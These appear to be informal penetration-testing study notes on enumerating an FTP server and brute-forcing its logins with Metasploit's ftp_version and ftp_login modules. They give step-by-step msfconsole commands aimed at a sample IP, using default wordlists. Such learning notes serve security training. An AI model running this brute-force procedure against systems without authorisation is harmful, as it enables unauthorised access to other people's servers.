FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients. 
+ It is also frequently used as a means of transferring files to and from the directory of a web server. 
+ We can use multiple auxiliary modules to enumerate information as well as perform brute-force attacks on targets running an FTP server. 
+ FTP authentication utilizes a username and password combination, however, in some cases an improperly configured FTP server can be logged into anonymously.

## **First Always check open ports

**is port 21 is OPEN 

## **then enumerate ftp service 

in this case we use metasploit-framework

**check portgresql stauts

```
service portgresql start
```
then
```
msfconsole
```

create workspace 
```
workspace -a new
```

then search Auxiliary Modules for fpt

```
search type:Auxiliary name:ftp
```

## **check ftp version
```
use auxiliary/scanner/ftp/ftp_version
```
then find exploit for that version.

## **now try brute force using metasploit users and password wordlist.

```
use auxiliary/scanner/ftp/ftp_login
```

**set RHOSTS
```
set RHOSTS 192.11.144.33
```
**set USER_FILE
```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
```
**set PASSWORD_FILE
```
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_password.txt
```

RUN
&
WAIT

________________________________________________

